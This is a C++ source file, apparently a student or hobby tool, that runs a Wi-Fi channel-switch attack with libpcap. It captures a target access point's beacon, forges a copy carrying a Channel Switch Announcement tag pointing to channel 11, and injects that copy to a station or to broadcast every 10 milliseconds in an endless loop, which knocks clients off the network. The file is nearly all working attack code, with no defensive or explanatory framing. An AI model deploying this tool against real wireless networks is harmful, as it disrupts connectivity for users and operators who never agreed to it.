#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <vector>
#include <pcap.h>
#include "param.h"
#include "dot11.h"
#include "radiotap.h"

struct AttackData {
    std::vector<uint8_t> frame;
    bool ready = false;
    pcap_t* handle = nullptr;
};

void beaconCallback(u_char* user, const struct pcap_pkthdr* header, const u_char* pkt) {
    AttackData* data = (AttackData*)user;

    Mac station;
    if (args_.hasStation)
        station = args_.staMac;
    else
        station = Mac("ff:ff:ff:ff:ff:ff");

    uint16_t rtLen;
    memcpy(&rtLen, pkt + 2, sizeof(rtLen));

    int minLen = rtLen + (int)sizeof(Dot11Hdr) + (int)sizeof(BeaconHdr::Fix);
    if ((int)header->caplen < minLen) return;

    Dot11Hdr dot11;
    memcpy(&dot11, pkt + rtLen, sizeof(Dot11Hdr));
    if (!dot11.isBeacon()) return;
    if (!(dot11.addr2_ == args_.apMac)) return;

    RadioTapHdr rtHdr;
    memcpy(&rtHdr, pkt, sizeof(RadioTapHdr));
    size_t fcsSize = rtHdr.get_fcs();

    int tagStart = rtLen + (int)sizeof(Dot11Hdr) + (int)sizeof(BeaconHdr::Fix);
    int tagEnd   = (int)header->caplen - (int)fcsSize;

    BeaconHdr::CsaTag csa;
    csa.number             = 0x25;
    csa.length             = 0x03;
    csa.channelSwitchMode  = 0x01;
    csa.newChannel         = 0x0B;
    csa.channelSwitchCount = 0x01;

    data->frame.clear();

    RadioTapHdr newRt;
    newRt.init();
    uint8_t* rtPtr = (uint8_t*)&newRt;
    data->frame.insert(data->frame.end(), rtPtr, rtPtr + sizeof(RadioTapHdr));

    BeaconHdr beaconHdr;
    memcpy(&beaconHdr, pkt + rtLen, sizeof(Dot11Hdr) + sizeof(BeaconHdr::Fix));
    beaconHdr.addr1_ = station;
    uint8_t* bhPtr = (uint8_t*)&beaconHdr;
    data->frame.insert(data->frame.end(), bhPtr, bhPtr + sizeof(Dot11Hdr) + sizeof(BeaconHdr::Fix));

    data->frame.insert(data->frame.end(), pkt + tagStart, pkt + tagEnd);

    uint8_t* csaPtr = (uint8_t*)&csa;
    data->frame.insert(data->frame.end(), csaPtr, csaPtr + sizeof(BeaconHdr::CsaTag));

    data->ready = true;
    pcap_breakloop(data->handle);
}

int main(int argc, char* argv[]) {
    if (!parseArgs(argc, argv)) {
        usage(argv[0]);
        return 1;
    }

    pcap_t* handle = openHandle(args_.iface);
    if (!handle) return 1;

    printInfo();

    AttackData data;
    data.handle = handle;

    printf("Waiting for beacon from AP...\n");
    pcap_loop(handle, -1, beaconCallback, (u_char*)&data);

    if (!data.ready) {
        fprintf(stderr, "Failed to capture beacon.\n");
        pcap_close(handle);
        return 1;
    }

    printf("Beacon captured. \n");

    int count = 0;
    while (true) {
        if (pcap_sendpacket(handle, data.frame.data(), (int)data.frame.size()) != 0) {
            fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
        } else {
            printf("CSA packet sent : count=%d\n", ++count);
        }
        usleep(10000); // 10ms 간격, 1초당 100번
    }

    pcap_close(handle);
    return 0;
}